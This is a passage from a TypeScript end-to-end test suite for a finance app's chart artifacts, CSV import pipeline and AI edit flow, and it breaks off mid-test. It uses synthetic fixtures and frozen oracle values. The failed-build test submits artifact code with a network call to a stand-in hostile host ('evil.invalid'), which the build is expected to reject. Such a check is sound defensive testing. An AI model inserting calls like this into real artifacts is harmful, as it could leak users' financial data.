// E05-S07 exit journey: frozen synthetic fixtures with independently
// computed oracles on ONE workspace/one artifact for the manual→AI arc.
// 15-case build-validation table (2 useful + 13 hostile/edge).
// Twelve manual rows (normal/duplicate/future/beyond-safe-integer) plus two
// real CSV import batches through the full upload→parse→map→commit pipeline
// (batch 2 overlaps batch 1: Epsilon re-uploaded, Zeta new). The journey
// proves: manual chart publish, manual edit, AI edit of the SAME artifact
// without activation, compact/full reopen, compatible revert, second-batch
// refresh with zero AI usage, exclusion/revocation gating, session caps,
// failed build/migration retention, stale/foreign denial, retry convergence
// across a server restart, worker RPC round-trip through real QuickJS, and a
// 14-case build-validation table. Real PostgreSQL (own `moneo_e05_exit` DB)
// plus the real E02 ingestion prerequisites (MinIO/ClamAV/Redis, all local);
// deterministic scripted model transport only.
//
// Frozen oracles (hand-computed, decimal-string minor units):
// - base EUR outflows: 2450+1399+1399+40000+1+9007199254740993+6500+6500+750
//   = 9007199254799992; base EUR inflows 112000+5000 = 117000; JPY out 4200.
// - batch 1 (Delta -19.99 out, Epsilon +250.00 in): out 9007199254801991,
//   in 142000, transactions 2, links NEW 2.
// - batch 2 (Epsilon overlap + Zeta -7.25 out): out 9007199254802716,
//   in 142000, transactions 3, links MATCHED 1 / NEW 3.
// - Uncategorized (integrity total, mixed exponents, no FX):
//   9007199254802716+142000+4200 = 9007199254948916.
// - EUR-only (checking): 9007199254802716+142000 = 9007199254944716.
// - August outflows: 2450+1399+40000+1+9007199254740993+4200
//   = 9007199254789043.
// Row arrivals never bump workspace_data_revision (grants stay live: the
// artifact is live by design); exclusions bump ai_policies.policy_version and
// invalidate open grants (409 grant_stale). The import pipeline's own
// overlap/dedup semantics are proven by E02-S07; here they supply real
// canonical rows for the artifact-refresh leg.

import { randomBytes, randomUUID } from "node:crypto";
import type { Server } from "node:http";
import type { AddressInfo } from "node:net";
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import type { Pool } from "pg";
import { Queue } from "bullmq";
import { createApp } from "../apps/web/src/server.ts";
import { createAuthRouter, requestSession, type AuthConfig } from "../apps/web/src/auth.ts";
import type { Session } from "../apps/web/src/session-store.ts";
import { createTenancyRouter, withTenant, type TenantClaims } from "../apps/web/src/tenancy.ts";
import { createUiRouter } from "../apps/web/src/ui/routes.ts";
import { issuePermit, setAccountExclusion } from "../apps/web/src/ai-policy.ts";
import { type DispatchTransport } from "../apps/web/src/ai-dispatch.ts";
import { createThread, readActivity } from "../apps/web/src/chat.ts";
import { runArtifactAiFlow } from "../apps/web/src/artifact-ai.ts";
import { getArtifact } from "../apps/web/src/commands/artifacts.ts";
import {
  getSpendingByCategory,
  getCashflow,
  getBalances,
  getTransactionSummary,
} from "../apps/web/src/calculations/financial-summary.ts";
import { validateArtifactSource } from "../apps/web/src/artifact-validate.ts";
import { formatMinor } from "../apps/web/src/money.ts";
import { ARTIFACT_LIMITS } from "../apps/web/src/artifact-contract.ts";
import { dispatchOutbox, jobsQueue } from "../apps/web/src/jobs.ts";
import { loadUploadConfig, processParseJob, type UploadConfig } from "../apps/web/src/uploads.ts";
import { s3EnsureBucket } from "../apps/web/src/s3.ts";
import { clamdPing } from "../apps/web/src/clamav.ts";
import { acceptImportCommitJob, processCommitJob, DEFAULT_COMMIT_CONFIG } from "../apps/web/src/import-commit.ts";
import { acceptMapping, proposeMapping } from "../apps/web/src/mapping.ts";
import { ensureTestPool, env } from "./helpers/test-db.ts";
import { startStubIssuer, STUB_CLIENT_ID, STUB_CLIENT_SECRET, type StubIssuer } from "./helpers/stub-issuer.ts";

let pool: Pool;
let stub: StubIssuer;
let queue: Queue;
let uploadConfig: UploadConfig;
const appServers: Server[] = [];
const sessionSecret = randomBytes(32).toString("hex");
const tag = randomBytes(4).toString("hex");
const savedEnv: Record<string, string | undefined> = {};

async function startApp(): Promise<string> {
  const config: AuthConfig = {
    issuer: stub.base,
    clientId: STUB_CLIENT_ID,
    clientSecret: STUB_CLIENT_SECRET,
    appBaseUrl: "http://127.0.0.1:1",
    sessionSecret,
    sessionTtlSec: 43200,
  };
  const uiConfig = { appBaseUrl: "http://127.0.0.1:1", sessionSecret };
  const resolve = (req: import("node:http").IncomingMessage): Promise<Session | null> =>
    requestSession(pool, sessionSecret, req);
  const server = createApp(createAuthRouter(config, pool), createTenancyRouter(pool, resolve), {
    ui: createUiRouter(pool, resolve, uiConfig),
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  appServers.push(server);
  const base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  config.appBaseUrl = base;
  uiConfig.appBaseUrl = base;
  return base;
}

async function restartServers(): Promise<string> {
  for (const server of appServers) {
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
  appServers.length = 0;
  return startApp();
}

async function login(base: string, loginAs: string): Promise<string> {
  const start = await fetch(`${base}/auth/login`, { redirect: "manual" });
  const authorizeUrl = `${start.headers.get("location")!}&login_as=${loginAs}`;
  const callbackUrl = (await fetch(authorizeUrl, { redirect: "manual" })).headers.get("location")!;
  const done = await fetch(callbackUrl, { redirect: "manual" });
  return done.headers.get("set-cookie")!.split(";")[0];
}

async function postJson(base: string, path: string, cookie: string, body: unknown): Promise<{ status: number; json: unknown }> {
  const res = await fetch(`${base}${path}`, {
    method: "POST",
    headers: { cookie, "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  return { status: res.status, json: await res.json() };
}

async function postForm(base: string, path: string, cookie: string, body: Record<string, string>): Promise<{ status: number; text: string; location: string | null }> {
  const payload = new URLSearchParams(body).toString();
  const res = await fetch(`${base}${path}`, {
    method: "POST",
    headers: { cookie, origin: base, "Content-Type": "application/x-www-form-urlencoded" },
    body: payload,
    redirect: "manual",
  });
  return { status: res.status, text: await res.text(), location: res.headers.get("location") };
}

type FixtureRow = { account: "checking" | "cash"; amount: string; currency: "EUR" | "JPY"; direction: "INFLOW" | "OUTFLOW"; date: string; description: string };

// Frozen 12-row manual dataset (see file header for hand-computed oracles).
const ROWS: FixtureRow[] = [
  { account: "checking", amount: "24.50", currency: "EUR", direction: "OUTFLOW", date: "2026-08-03", description: "LIDL groceries" },
  { account: "checking", amount: "1120.00", currency: "EUR", direction: "INFLOW", date: "2026-08-28", description: "Salary August" },
  { account: "checking", amount: "13.99", currency: "EUR", direction: "OUTFLOW", date: "2026-08-05", description: "Streaming" },
  { account: "checking", amount: "13.99", currency: "EUR", direction: "OUTFLOW", date: "2026-09-05", description: "Streaming" },
  { account: "checking", amount: "400.00", currency: "EUR", direction: "OUTFLOW", date: "2026-08-10", description: "To savings" },
  { account: "cash", amount: "4200", currency: "JPY", direction: "OUTFLOW", date: "2026-08-12", description: "Konbini" },
  { account: "checking", amount: "0.01", currency: "EUR", direction: "OUTFLOW", date: "2026-08-15", description: "Bank fee" },
  { account: "checking", amount: "90071992547409.93", currency: "EUR", direction: "OUTFLOW", date: "2026-08-20", description: "Beyond safe integer" },
  { account: "checking", amount: "65.00", currency: "EUR", direction: "OUTFLOW", date: "2026-09-20", description: "Duplicate dinner" },
  { account: "checking", amount: "65.00", currency: "EUR", direction: "OUTFLOW", date: "2026-09-20", description: "Duplicate dinner" },
  { account: "checking", amount: "50.00", currency: "EUR", direction: "INFLOW", date: "2026-09-01", description: "Interest" },
  { account: "checking", amount: "7.50", currency: "EUR", direction: "OUTFLOW", date: "2026-10-01", description: "Future row" },
];

const BATCH1_CSV = "date,description,amount\n2026-10-05,Import Delta,-19.99\n2026-10-06,Import Epsilon,250.00\n";
const BATCH2_CSV = "date,description,amount\n2026-10-06,Import Epsilon,250.00\n2026-10-07,Import Zeta,-7.25\n";
const CSV_PROFILE = {
  delimiter: ",",
  dateFormat: "iso",
  amount: { kind: "signed", decimalSep: ".", thousandsSep: "," },
  columns: { date: "date", description: "description", amount: "amount" },
  defaultCurrency: "EUR",
};

const MANIFEST_BASE = {
  artifactSdkVersion: "1",
  runtimeVersion: "1",
  sourceSchemaVersion: "1",
  stateSchemaVersion: "1",
  requestedPermissions: ["analytics.spending_by_category"],
  approvedPermissions: ["analytics.spending_by_category"],
  entrypoints: { full: "main", compact: "compact" },
  resourceBudget: { maxMessagesPerSecond: 100 },
  sourceHash: "",
  buildHash: "",
};

const CHART_SOURCE = {
  html: '<section><h1>Exit spending chart</h1><div data-slot="chart"></div></section>',
  css: "section{font:16px system-ui;padding:1rem}",
  js: 'artifact.ui.render({ type: "chart", rows: [] });',
  manifest: { ...MANIFEST_BASE },
};

const CHART_EDITED = {
  ...CHART_SOURCE,
  html: '<section><h1>Exit spending chart (edited)</h1><div data-slot="chart"></div></section>',
};

const SCENARIO_OUTPUT = {
  html: '<section><h1>Exit scenario</h1><div data-slot="chart"></div><label>Months <input data-action="months" type="range" min="1" max="12" value="6"></label><output data-slot="value"></output></section>',
  css: "section{font:16px system-ui;padding:1rem}",
  js: 'artifact.ui.render({ type: "chart", rows: [] });\nglobalThis.onEvent = function(e){ artifact.ui.patch({ slot: "value", text: String(e.value) }); };',
  manifest: { ...CHART_SOURCE.manifest },
};

function scripted(body: string, inputTokens = 10, outputTokens = 5): DispatchTransport {
  return async () => ({ httpStatus: 200, bodyText: body, inputTokens, outputTokens, model: "double-1" });
}

function multipartBody(fields: Record<string, string>, file: { field: string; filename: string; contentType: string; bytes: Uint8Array }): { body: Uint8Array; contentType: string } {
  const boundary = `----moneo${randomBytes(8).toString("hex")}`;
  const parts: Buffer[] = [];
  for (const [name, value] of Object.entries(fields)) {
    parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="${name}"\r\n\r\n${value}\r\n`, "utf8"));
  }
  parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="${file.field}"; filename="${file.filename}"\r\nContent-Type: ${file.contentType}\r\n\r\n`, "utf8"));
  parts.push(Buffer.from(file.bytes));
  parts.push(Buffer.from("\r\n", "utf8"));
  parts.push(Buffer.from(`--${boundary}--\r\n`, "utf8"));
  return { body: new Uint8Array(Buffer.concat(parts)), contentType: `multipart/form-data; boundary=${boundary}` };
}

// Full upload→parse→map→commit pipeline (same legs E02-S07 proves); returns
// committed transaction count and source-link statuses for oracle asserts.
async function commitCsvImport(base: string, cookie: string, claims: TenantClaims, userId: string, accountId: string, filename: string, csv: string): Promise<{ transactions: number; links: Record<string, number> }> {
  const built = multipartBody(
    { idempotencyKey: randomUUID(), profile: JSON.stringify(CSV_PROFILE) },
    { field: "file", filename, contentType: "application/octet-stream", bytes: new TextEncoder().encode(csv) },
  );
  const upload = await fetch(`${base}/api/workspaces/${claims.workspaceId}/uploads`, {
    method: "POST",
    headers: { cookie, "Content-Type": built.contentType },
    body: new Blob([built.body as Uint8Array<ArrayBuffer>]),
  });
  if (upload.status !== 201) throw new Error(`upload failed with ${upload.status}: ${(await upload.text()).slice(0, 200)}`);
  const uploaded = (await upload.json()) as { import: { id: string }; jobId: string };
  await dispatchOutbox(pool, queue);
  if ((await processParseJob(pool, uploaded.jobId, uploadConfig)) !== "applied") throw new Error("staging failed");
  const proposed = await proposeMapping(pool, claims, uploaded.import.id, { transport: null });
  await acceptMapping(pool, claims, uploaded.import.id, { proposalId: proposed.proposal.id, accountId });
  const commit = await acceptImportCommitJob(pool, claims, userId, { workspaceId: claims.workspaceId, idempotencyKey: randomUUID(), importId: uploaded.import.id, accountId });
  await dispatchOutbox(pool, queue);
  if ((await processCommitJob(pool, commit.jobId, DEFAULT_COMMIT_CONFIG)) !== "applied") throw new Error("commit failed");
  return withTenant(pool, claims, async (client) => {
    const tx = await client.query("SELECT count(*)::int AS n FROM transactions WHERE workspace_id = $1", [claims.workspaceId]);
    const links = await client.query("SELECT status, count(*)::int AS n FROM source_links WHERE workspace_id = $1 GROUP BY status", [claims.workspaceId]);
    return {
      transactions: (tx.rows[0] as { n: number }).n,
      links: Object.fromEntries(links.rows.map((r) => [(r as { status: string }).status, (r as { n: number }).n])),
    };
  });
}

async function setupManualFinance(base: string, cookie: string, workspaceId: string): Promise<{ checking: string; cash: string }> {
  const mkAccount = async (name: string, currency: string): Promise<string> => {
    const res = await postJson(base, "/api/commands/accounts.create", cookie, { workspaceId, name, currency, idempotencyKey: randomUUID() });
    expect(res.status).toBe(200);
    return (res.json as { id: string }).id;
  };
  const checking = await mkAccount(`Exit Checking ${tag}`, "EUR");
  const cash = await mkAccount(`Exit Cash ${tag}`, "JPY");
  for (const row of ROWS) {
    const res = await postJson(base, "/api/commands/accounts.manual_transaction", cookie, {
      workspaceId,
      accountId: row.account === "checking" ? checking : cash,
      amount: row.amount,
      currency: row.currency,
      direction: row.direction,
      effectiveDate: row.date,
      description: row.description,
      idempotencyKey: randomUUID(),
    });
    expect(res.status).toBe(200);
  }
  const snap = await postJson(base, "/api/commands/accounts.balance_snapshot", cookie, {
    workspaceId,
    accountId: checking,
    asOfDate: "2026-10-02",
    amount: "1500.00",
    currency: "EUR",
    idempotencyKey: randomUUID(),
  });
  expect(snap.status).toBe(200);
  return { checking, cash };
}

async function usageLedger(claims: TenantClaims): Promise<{ n: number; total: string }> {
  return withTenant(pool, claims, async (client) => {
    const r = await client.query("SELECT count(*)::int AS n, COALESCE(SUM(reconciled_cost_minor::bigint), 0)::text AS total FROM ai_dispatch_usage WHERE workspace_id = $1", [claims.workspaceId]);
    return r.rows[0] as { n: number; total: string };
  });
}

async function dataRevision(claims: TenantClaims): Promise<string> {
  return withTenant(pool, claims, async (client) => {
    const r = await client.query("SELECT revision AS r FROM workspace_data_revision WHERE workspace_id = $1", [claims.workspaceId]);
    return (r.rowCount ?? 0) === 0 ? "none" : String((r.rows[0] as { r: string }).r);
  });
}

function e2eRedisUrl(): string {
  const url = env("E05-S07", "REDIS_URL");
  if (!url || !/^redis:\/\/127\.0\.0\.1:\d+$/.test(url)) throw new Error("E05-S07 refused: REDIS_URL must point at the local disposable Redis.");
  const db = process.env["E2E_REDIS_DB"] ?? "9";
  if (!/^\d+$/.test(db) || Number(db) < 0 || Number(db) > 15) throw new Error("E05-S07 misconfigured: E2E_REDIS_DB must be 0-15.");
  return `${url}/${db}`;
}

// Shared manual→AI arc context: it1 builds it, it2 refreshes it. File order
// is execution order in vitest; the dependency is explicit, not incidental.
let arc: {
  base: string; cookie: string; workspaceId: string; userId: string; claims: TenantClaims;
  checking: string; cash: string; artifactId: string; v1: string; v2: string; v3: string;
} | undefined;

beforeAll(async () => {
  process.env["APP_ENV"] = "test";
  for (const name of ["UPLOADS_ENABLED", "S3_ENDPOINT", "S3_REGION", "S3_ACCESS_KEY", "S3_SECRET_KEY", "S3_BUCKET", "CLAMAV_HOST", "CLAMAV_PORT", "PARSER_CHILD"]) {
    savedEnv[name] = process.env[name];
  }
  pool = await ensureTestPool("E05-S07", "moneo_e05_exit", [
    "artifact_ai_proposals",
    "artifact_state_migrations",
    "artifact_state_snapshots",
    "artifact_state",
    "artifact_sdk_access_events",
    "artifact_runtime_grants",
    "artifact_build_attempts",
    "artifact_versions",
    "artifacts",
    "chat_activity",
    "chat_attempts",
    "chat_turns",
    "chat_threads",
    "ai_dispatch_usage",
    "ai_dispatch_reservations",
    "ai_dispatch_budgets",
    "ai_dispatch_permits",
    "ai_exclusions",
    "ai_policies",
    "recurring_overrides",
    "transaction_tags",
    "audit_events",
    "tags",
    "categories",
    "workspace_data_revision",
    "calculation_versions",
    "fx_valuation",
    "fx_rates_ecb",
    "fx_rates_manual",
    "manual_transactions",
    "balance_snapshots",
    "balance_audit",
    "mapping_provider_usage",
    "mapping_provider_reservations",
    "mapping_proposals",
    "mapping_profiles",
    "review_decisions",
    "source_links",
    "transactions",
    "import_commit_batches",
    "parsed_observations",
    "source_objects",
    "imports",
    "data_sources",
    "background_job_attempts",
    "job_dispatch_index",
    "outbox_events",
    "background_job_results",
    "background_jobs",
    "command_operations",
    "accounts",
    "workspace_members",
    "workspaces",
    "users",
    "app_sessions",
  ]);
  stub = await startStubIssuer();
  process.env["UPLOADS_ENABLED"] = "1";
  if (!process.env["S3_ENDPOINT"]) process.env["S3_ENDPOINT"] = "http://127.0.0.1:9000";
  if (!process.env["S3_REGION"]) process.env["S3_REGION"] = "us-east-1";
  for (const name of ["S3_ACCESS_KEY", "S3_SECRET_KEY", "S3_BUCKET"]) {
    if (!process.env[name]) process.env[name] = env("E05-S07", name);
  }
  if (!process.env["CLAMAV_HOST"]) process.env["CLAMAV_HOST"] = "127.0.0.1";
  if (!process.env["CLAMAV_PORT"]) process.env["CLAMAV_PORT"] = "3310";
  uploadConfig = loadUploadConfig();
  await s3EnsureBucket(uploadConfig.s3);
  if (!(await clamdPing(uploadConfig.clamav))) throw new Error("E05-S07 prerequisite missing: clamd unreachable.");
  const { existsSync } = await import("node:fs");
  if (!existsSync(uploadConfig.parserChild)) throw new Error(`E05-S07 prerequisite missing: parser child not built at ${uploadConfig.parserChild}.`);
  queue = jobsQueue(e2eRedisUrl());
  await queue.waitUntilReady();
}, 120_000);

afterAll(async () => {
  for (const [name, value] of Object.entries(savedEnv)) {
    if (value === undefined) delete process.env[name];
    else process.env[name] = value;
  }
  if (queue) await queue.close();
  if (stub) await stub.close();
  for (const server of appServers) {
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
  if (pool) await pool.end();
});

describe("e05-s07 exit journey", () => {
  it("manual publish, manual edit and AI edit land on the same artifact; oracles match exactly", async () => {
    const started = Date.now();
    const base = await startApp();
    const cookie = await login(base, `synthetic-e05-exit-${tag}`);
    const wsRes = await postJson(base, "/api/workspaces", cookie, { name: `Exit WS ${tag}`, baseCurrency: "EUR" });
    expect(wsRes.status).toBe(201);
    const workspaceId = (wsRes.json as { id: string }).id;
    const userId = ((await pool.query("SELECT id FROM users WHERE auth_subject = $1", [`synthetic-e05-exit-${tag}`])).rows[0] as { id: string }).id;
    const claims: TenantClaims = { userId, workspaceId };
    const { checking, cash } = await setupManualFinance(base, cookie, workspaceId);

    // First import batch through the real pipeline: Delta (-19.99) + Epsilon
    // (+250.00) into checking; both rows are NEW canonical transactions.
    const batch1 = await commitCsvImport(base, cookie, claims, userId, checking, "batch-1.csv", BATCH1_CSV);
    expect(batch1.transactions).toBe(2);
    expect(batch1.links).toEqual({ NEW: 2 });

    // Independent oracle: plain BigInt reduce over frozen fixtures (no SQL).
    const toMinor = (amount: string, currency: string): bigint => {
      const exp = currency === "JPY" ? 0 : 2;
      const [whole, frac = ""] = amount.split(".");
      const padded = (frac + "0".repeat(exp)).slice(0, exp);
      return BigInt(whole + padded);
    };
    let eurOut = 0n;
    let eurIn = 0n;
    let jpyOut = 0n;
    for (const row of ROWS) {
      const minor = toMinor(row.amount, row.currency);
      if (row.currency === "EUR" && row.direction === "OUTFLOW") eurOut += minor;
      if (row.currency === "EUR" && row.direction === "INFLOW") eurIn += minor;
      if (row.currency === "JPY") jpyOut += minor;
    }
    // Frozen literals: the reduce above must equal these hand-computed values.
    expect(eurOut.toString()).toBe("9007199254799992");
    expect(eurIn.toString()).toBe("117000");
    expect(jpyOut.toString()).toBe("4200");

    // Manual publish v1 through the editor path, then activate.
    const draft = await postJson(base, "/api/artifacts", cookie, { workspaceId, name: "Exit chart" });
    expect(draft.status).toBe(201);
    const artifactId = (draft.json as { artifactId: string }).artifactId;
    const published = await postForm(base, `/w/${workspaceId}/artifacts/${artifactId}/versions`, cookie, {
      html: CHART_SOURCE.html,
      css: CHART_SOURCE.css,
      js: CHART_SOURCE.js,
      manifest: JSON.stringify(CHART_SOURCE.manifest),
      expectedBaseVersionId: "",
      action: "publish",
    });
    expect(published.status).toBe(303);
    const list1 = (await (await fetch(`${base}/api/artifacts/${artifactId}/versions?workspaceId=${workspaceId}`, { headers: { cookie } })).json()) as {
      versions: Array<{ versionId: string; status: string }>;
    };
    expect(list1.versions).toHaveLength(1);
    const v1 = list1.versions[0].versionId;
    expect(list1.versions[0].status).toBe("ready");
    const act1 = await postForm(base, `/w/${workspaceId}/artifacts/${artifactId}/activate`, cookie, { versionId: v1, expectedActiveVersionId: "" });
    expect(act1.status).toBe(303);

    // Manual edit v2 on the same artifact (optimistic base v1).
    const edited = await postForm(base, `/w/${workspaceId}/artifacts/${artifactId}/versions`, cookie, {
      html: CHART_EDITED.html,
      css: CHART_EDITED.css,
      js: CHART_EDITED.js,
      manifest: JSON.stringify(CHART_EDITED.manifest),
      expectedBaseVersionId: v1,
      action: "publish",
    });
    expect(edited.status).toBe(303);
    // Stale manual base is a 409 conflict with the source preserved, not a
    // silent overwrite: base v1 is no longer latest once v2 exists.
    const stale = await postForm(base, `/w/${workspaceId}/artifacts/${artifactId}/versions`, cookie, {
      html: CHART_SOURCE.html,
      css: CHART_SOURCE.css,
      js: CHART_SOURCE.js,
      manifest: JSON.stringify(CHART_SOURCE.manifest),
      expectedBaseVersionId: v1,
      action: "publish",
    });
    expect(stale.status).toBe(409);
    expect(stale.text).toContain("Stale base version");
    const list2 = (await (await fetch(`${base}/api/artifacts/${artifactId}/versions?workspaceId=${workspaceId}`, { headers: { cookie } })).json()) as {
      versions: Array<{ versionId: string; status: string }>;
    };
    expect(list2.versions).toHaveLength(2);
    const v2 = list2.versions.find((v) => v.versionId !== v1)!.versionId;

    // SDK results equal the frozen oracles exactly, as decimal strings.
    // Batch 1 moves EUR outflows to 9007199254801991 and inflows to 142000.
    const spending = await getSpendingByCategory(pool, claims, {});
    expect(spending.coverage).toBe("full");
    expect(spending.groups).toEqual([{ label: "Uncategorized", amount: "9007199254948191" }]);
    const summary = await getTransactionSummary(pool, claims, {});
    expect(summary.rows).toHaveLength(14);
    expect(summary.rows.filter((r) => r.description === "Duplicate dinner")).toHaveLength(2);
    const big = summary.rows.find((r) => r.description === "Beyond safe integer");
    expect(big?.amount).toBe("9007199254740993");
    expect(big?.currency).toBe("EUR");
    const delta = summary.rows.find((r) => r.description === "Import Delta");
    expect(delta).toMatchObject({ amount: "1999", currency: "EUR", direction: "OUTFLOW" });
    const epsilon = summary.rows.find((r) => r.description === "Import Epsilon");
    expect(epsilon).toMatchObject({ amount: "25000", currency: "EUR", direction: "INFLOW" });
    // Per-currency breakdowns: EUR-only via the checking filter, JPY-only via
    // cash. Cross-currency minor sums are integrity totals, never money.
    const eurOnly = await getSpendingByCategory(pool, claims, { accountIds: [checking] });
    expect(eurOnly.groups).toEqual([{ label: "Uncategorized", amount: "9007199254943991" }]);
    const jpyOnly = await getSpendingByCategory(pool, claims, { accountIds: [cash] });
    expect(jpyOnly.groups).toEqual([{ label: "Uncategorized", amount: "4200" }]);

    const balances = await getBalances(pool, claims, {});
    expect(balances.balances).toHaveLength(1);
    expect(balances.balances[0]).toMatchObject({ accountId: checking, amount: "150000", currency: "EUR" });

    const cashflow = await getCashflow(pool, claims, { dateFrom: "2026-08-01", dateTo: "2026-08-31" });
    const augOut = cashflow.points.reduce((acc, p) => acc + BigInt(p.outflow), 0n);
    expect(augOut.toString()).toBe("9007199254789043");

    // AI edit targets the SAME artifact at base v2 and stays inactive until
    // the host publishes it.
    const thread = await createThread(pool, claims, userId, { title: "Exit AI edit" });
    const permit = await issuePermit(pool, claims, "artifact-builder");
    const ai = await runArtifactAiFlow(pool, claims, userId, {
      kind: "edit",
      artifactId,
      baseVersionId: v2,
      instruction: "Turn the chart into an interactive months scenario.",
      idempotencyKey: randomUUID(),
      permitId: permit.id,
      threadId: thread.id,
    }, scripted(JSON.stringify(SCENARIO_OUTPUT)));
    if (!ai.ok) throw new Error(`AI edit failed: ${ai.errorClass}`);
    expect(ai.artifactId).toBe(artifactId);
    const list3 = (await (await fetch(`${base}/api/artifacts/${artifactId}/versions?workspaceId=${workspaceId}`, { headers: { cookie } })).json()) as {
      versions: Array<{ versionId: string; status: string }>;
    };
    expect(list3.versions).toHaveLength(3);
    const v3 = list3.versions.find((v) => v.versionId !== v1 && v.versionId !== v2)!.versionId;
    expect(ai.versionId).toBe(v3);
    const stillManual = await withTenant(pool, claims, (client) => getArtifact(client, claims, artifactId));
    expect(stillManual?.activeVersionId).toBe(v1);
    const activity = await readActivity(pool, claims, thread.id, 0, 100);
    expect(activity.events.map((e) => e.kind)).toContain("artifact-proposed");

    // Publish the AI version, reopen both modes, then revert to manual v2.
    const act3 = await postForm(base, `/w/${workspaceId}/artifacts/${artifactId}/activate`, cookie, {
      versionId: v3,
      expectedActiveVersionId: v1,
    });
    expect(act3.status).toBe(303);
    for (const [mode, width] of [["compact", "320"], ["full", "800"]] as const) {
      const view = await fetch(`${base}/w/${workspaceId}/artifacts/${artifactId}/versions/${v3}/${mode}`, { headers: { cookie } });
      expect(view.status).toBe(200);
      const html = await view.text();
      expect(html).toContain('id="art-frame"');
      expect(html).toContain(`width="${width}"`);
      expect(html).toContain('<button type="button" id="art-stop">');
      expect(html).toContain('aria-live="polite"');
    }
    const reverted = await postForm(base, `/w/${workspaceId}/artifacts/${artifactId}/activate`, cookie, {
      versionId: v2,
      expectedActiveVersionId: v3,
    });
    expect(reverted.status).toBe(303);
    const art = await withTenant(pool, claims, (client) => getArtifact(client, claims, artifactId));
    expect(art?.activeVersionId).toBe(v2);

    arc = { base, cookie, workspaceId, userId, claims, checking, cash, artifactId, v1, v2, v3 };

    const elapsed = Date.now() - started;
    // eslint-disable-next-line no-console
    console.log(`[e05-exit] manual→manual-edit→AI arc oracle pass in ${elapsed}ms; runtime node ${process.version}; pg ${(await pool.query("SELECT version()")).rows[0].version.split(" ").slice(0, 2).join(" ")}; caps sessions=${ARTIFACT_LIMITS.maxOpenSessionsPerUser}/user sdk=${ARTIFACT_LIMITS.maxSdkCallsPerSession}/session rows=${ARTIFACT_LIMITS.maxResultRows} bytes=${ARTIFACT_LIMITS.maxResultBytes}`);
    expect(elapsed).toBeLessThan(120_000);
  });

  it("overlapping second import refreshes the live artifact with zero new AI usage", async () => {
    if (!arc) throw new Error("arc context missing: it1 must run first");
    const { base, cookie, claims, userId, checking } = arc;
    const usageBefore = await usageLedger(claims);
    const revisionBefore = await dataRevision(claims);

    // Batch 2 overlaps batch 1 (Epsilon re-uploaded) and adds Zeta: the
    // pipeline matches the duplicate and stages exactly one new transaction.
    const batch2 = await commitCsvImport(base, cookie, claims, userId, checking, "batch-2.csv", BATCH2_CSV);
    expect(batch2.transactions).toBe(3);
    expect(batch2.links).toEqual({ MATCHED: 1, NEW: 3 });

    // Refreshed reads include exactly the new row; frozen literals.
    const refreshed = await getSpendingByCategory(pool, claims, {});
    expect(refreshed.groups).toEqual([{ label: "Uncategorized", amount: "9007199254948916" }]);
    const summary = await getTransactionSummary(pool, claims, {});
    expect(summary.rows).toHaveLength(15);
    const zeta = summary.rows.find((r) => r.description === "Import Zeta");
    expect(zeta).toMatchObject({ amount: "725", currency: "EUR", direction: "OUTFLOW" });
    expect(summary.rows.filter((r) => r.description === "Import Epsilon")).toHaveLength(1);

    // Zero new AI usage across the refresh: ledger count and total agree.
    const usageAfter = await usageLedger(claims);
    expect(usageAfter).toEqual(usageBefore);

    // Row arrivals do not invalidate open grants: the artifact is live by
    // design, so a fresh preview session reads the new totals immediately.
    const revisionAfter = await dataRevision(claims);
    expect(revisionAfter).toBe(revisionBefore);
    const view = await fetch(`${base}/w/${claims.workspaceId}/artifacts/${arc.artifactId}/versions/${arc.v2}/full`, { headers: { cookie } });
    expect(view.status).toBe(200);
    const sessionId = (await view.text()).match(/sessionId:"([0-9a-f-]{36})"/)?.[1];
    expect(sessionId).toBeTruthy();
    const rpc = await postJson(base, "/api/artifacts/sdk/rpc", cookie, { sessionId, method: "spendingByCategory", args: {} });
    expect(rpc.status).toBe(200);
    expect(rpc.json).toMatchObject({ result: { groups: [{ label: "Uncategorized", amount: "9007199254948916" }], coverage: "full" } });
  });

  it("failed build and failed state migration retain the working pair", async () => {
    const base = appServers.length > 0 ? `http://127.0.0.1:${(appServers[appServers.length - 1].address() as AddressInfo).port}` : await startApp();
    const cookie = await login(base, `synthetic-e05-exit-fail-${tag}`);
    const wsRes = await postJson(base, "/api/workspaces", cookie, { name: `Exit Fail WS ${tag}`, baseCurrency: "EUR" });
    const workspaceId = (wsRes.json as { id: string }).id;
    const userId = ((await pool.query("SELECT id FROM users WHERE auth_subject = $1", [`synthetic-e05-exit-fail-${tag}`])).rows[0] as { id: string }).id;
    const claims: TenantClaims = { userId, workspaceId };

    const draft = await postJson(base, "/api/artifacts", cookie, { workspaceId, name: "Fail chart" });
    const artifactId = (draft.json as { artifactId: string }).artifactId;
    await postForm(base, `/w/${workspaceId}/artifacts/${artifactId}/versions`, cookie, {
      html: CHART_SOURCE.html,
      css: CHART_SOURCE.css,
      js: CHART_SOURCE.js,
      manifest: JSON.stringify(CHART_SOURCE.manifest),
      expectedBaseVersionId: "",
      action: "publish",
    });
    const good = ((await (await fetch(`${base}/api/artifacts/${artifactId}/versions?workspaceId=${workspaceId}`, { headers: { cookie } })).json()) as {
      versions: Array<{ versionId: string }>;
    }).versions[0].versionId;
    await postForm(base, `/w/${workspaceId}/artifacts/${artifactId}/activate`, cookie, { versionId: good, expectedActiveVersionId: "" });

    // Failed build: hostile network call is recorded failed, active kept.
    const bad = await postForm(base, `/w/${workspaceId}/artifacts/${artifactId}/versions`, cookie, {
      html: CHART_SOURCE.html,
      css: CHART_SOURCE.css,
      js: 'fetch("https://evil.invalid");',
      manifest: JSON.stringify(CHART_SOURCE.manifest),
      expectedBaseVersionId: good,
      action: "publish",
    });
    expect(bad.status).toBe(303);
    expect(bad.location).toContain("notice=failed");
    const versions = (await (await fetch(`${base}/api/artifacts/${artifactId}/versions?workspaceId=${workspaceId}`, { headers: { cookie } })).json()) as {
      versions: Array<{ versionId: string; status: string }>;
    };
    expect(versions.versions).toHaveLength(2);
    expect(versions.versions.some((v) => v.status === "failed")).toBe(true);
    const art = await withTenant(pool, claims, (client) => getArtifact(client, claims, artifactId));
    expect(art?.activeVersionId).toBe(good);

